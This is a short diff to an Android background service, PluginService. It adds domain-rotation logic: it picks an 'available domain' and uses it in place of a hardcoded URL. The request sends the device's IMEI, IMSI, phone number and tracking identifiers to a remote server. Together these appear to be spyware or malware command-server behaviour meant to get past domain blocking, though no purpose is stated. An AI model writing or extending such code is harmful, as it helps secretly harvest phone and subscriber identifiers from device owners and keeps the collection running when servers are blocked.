@@ -115,13 +115,15 @@ public class PluginService extends IntentService {
             if (TextUtils.isEmpty(imsi)) {
                 imsi = "987654321";
             }
+            String domain = DomanManager.getInstance(getApplicationContext()).getOneAviableDomain();
+            if (TextUtils.isEmpty(domain)) return;
             MainActiveRequest request = new MainActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                          , imei
                                                          , imsi
                                                          , SettingManager.getInstance().getMainApkChannel()
                                                          , phone
                                                          , SettingManager.getInstance().getMainApkSendUUID()
-                                                         , "http://www.xinsuotd.net/gais/"
+                                                         , domain + "/gais/"
                                                          , SettingManager.getInstance().getMainExtraInfo());
             MainActiveResponse response = InternetUtils.request(getApplicationContext(), request);
 
